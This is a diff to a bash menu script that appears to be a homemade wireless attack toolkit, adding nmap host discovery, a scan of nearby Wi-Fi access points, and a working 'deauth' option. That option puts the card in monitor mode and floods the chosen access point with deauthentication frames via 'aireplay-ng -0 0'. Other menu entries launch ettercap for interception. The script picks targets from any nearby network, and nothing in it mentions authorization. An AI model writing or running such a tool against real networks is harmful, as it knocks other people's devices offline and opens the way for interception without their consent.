@@ -2,32 +2,52 @@
 clear
 exit=0
 
+#Function to determine CIDR and then scan using nmap providing selection options
+auto_map(){
+	echo "Please wait. Scanning..."
+	count=0
+	targetIPs=()
+	for i in $( nmap -v -sn $(ipcalc $(ifconfig | grep "Bcast" | awk -F':' '{print $2}' | awk -F' ' '{print $1}') | grep "Network" | awk -F' ' '{print $2}')| grep -v "host down" | grep "Nmap scan report" | awk '{print $5}' )
+	do
+		targetIPs[$count]="$i"
+		targetIPs[$(( count+1 ))]=" "
+		count=$(( $count + 2 ))
+	done
+	#3>&2 2&1 1>&3- is needed to make the whiptail UI appear.
+	CURRENT_TARGET=$( whiptail --menu "Select a target host:" 20 80 10 \
+		"${targetIPs[@]}" 3>&2 2>&1 1>&3- )
+	CURRENT_TARGET2=$( whiptail --menu "Select a target client:" 20 80 10 \
+		"${targetIPs[@]}" 3>&2 2>&1 1>&3- )
+}
+
+AVAILABLEAP=()
+TARGETAP=""
+
+Nearby_Mac(){
+	AvailableAP=()
+	for i in $( iwlist wlan2 scan | grep 'Address' | awk -F' ' '{print $5}' )
+	do
+		AvailableAP[$count]="$i"
+		count=$(( $count + 2 ))
+	done
+	count=1
+	for i in $( iwlist wlan2 scan | grep 'ESSID' | awk -F':' '{print $2}' | sed -e 's/ /_/g' )
+	do
+		AvailableAP[$count]="$i"
+		count=$(( $count + 2 ))
+	done
+	TARGETAP=$( whiptail --menu "Select a target host:" 20 80 10 \
+			"${AvailableAP[@]}" 3>&2 2>&1 1>&3- )
+	pkill iwlist
+}
+
 ##Main loop
 while [ exit != 2 ]; do
 	#Functions and variables
-	polo(){
-		echo "polo"
-	}
 	
 	CURRENT_TARGET=""
 	CURRENT_TARGET2=""
-	#Function to determine CIDR and then scan using nmap providing selection options
-	auto_map(){
-		echo "Please wait. Scanning..."
-		n=0
-		targetIPs=()
-		for i in $( nmap -v -sn $(ipcalc $(ifconfig | grep "Bcast" | awk -F':' '{print $2}' | awk -F' ' '{print $1}') | grep "Network" | awk -F' ' '{print $2}')| grep -v "host down" | grep "Nmap scan report" | awk '{print $5}' )
-		do
-			targetIPs[$count]="$i"
-			targetIPs[$(( count+1 ))]=" "
-			count=$(( $count + 2 ))
-		done
-		#3>&2 2&1 1>&3- is needed to make the whiptail UI appear.
-		CURRENT_TARGET=$( whiptail --menu "Select a target host:" 20 80 10 \
-			"${targetIPs[@]}" 3>&2 2>&1 1>&3- )
-		CURRENT_TARGET2=$( whiptail --menu "Select a target client:" 20 80 10 \
-			"${targetIPs[@]}" 3>&2 2>&1 1>&3- )
-	}
+	
 	
 	
 	#Title Screen
@@ -126,7 +146,11 @@ while [ exit != 2 ]; do
 	ettercap) ettercap -G
 	;;
 	#Will be my favorite if it will work! gah!
-	deauth)
+	deauth)Nearby_Mac
+		airmon-ng start wlan2
+		aireplay-ng -0 0 -a $TARGETAP
+		wait
+		airmon-ng stop mon0
 	;;
 	#exits the loop of eternity
 	quit) exit = 1
